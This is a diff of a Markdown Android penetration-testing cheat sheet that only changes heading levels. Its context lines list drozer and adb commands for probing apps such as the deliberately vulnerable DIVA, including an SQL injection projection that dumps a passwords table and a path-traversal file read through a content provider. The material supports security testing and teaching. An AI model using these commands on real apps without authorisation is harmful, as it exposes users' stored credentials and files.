@@ -132,7 +132,7 @@ dz> run app.service.start --component jakhar.aseem.diva jakhar.aseem.diva.TestSe
 ```
 
 
-#### Exploiting Content providers
+## Exploiting Content providers
 Content provider to access to database
 ```
 adb shell content query --uri <contentprovideruri>
@@ -153,7 +153,7 @@ dz> run app.provider.query --uri content://com.abc.testabc.contentprovider/pwds/
 dz> run app.provider.query --uri content://com.abc.testabc.contentprovider/pwds/ --projection " * FROM passwords;"  #querying database
 ```
 
-Content provider to access files
+#### Content provider to access files
 ```
 adb shell content read --uri <contentprovideruri>
 ```
@@ -167,13 +167,13 @@ dz> run scanner.provider.traversal -a com.abc.testabc   #scan for pathtraversal 
 dz> run app.provider.read content://com.example.vulnerableapp.provider/../../../../test.txt   #exploting & reading files
 ```
 
-DROZER ATTACK SURFACE SCAN & MANIFEST READ
+#### DROZER ATTACK SURFACE SCAN & MANIFEST READ
 ```
 dz> run app.package.attacksurface jakhar.aseem.diva    #attack surface listing
 dz> run app.package.manifest jakhar.aseem.diva     #manifest file listing
 ```
 
-Debuggable app connection</br>
+## Debuggable app connection</br>
 Open debuggable app then run below command
 ```
 adb jdwp   #it shows the port to socket of dubuggale app
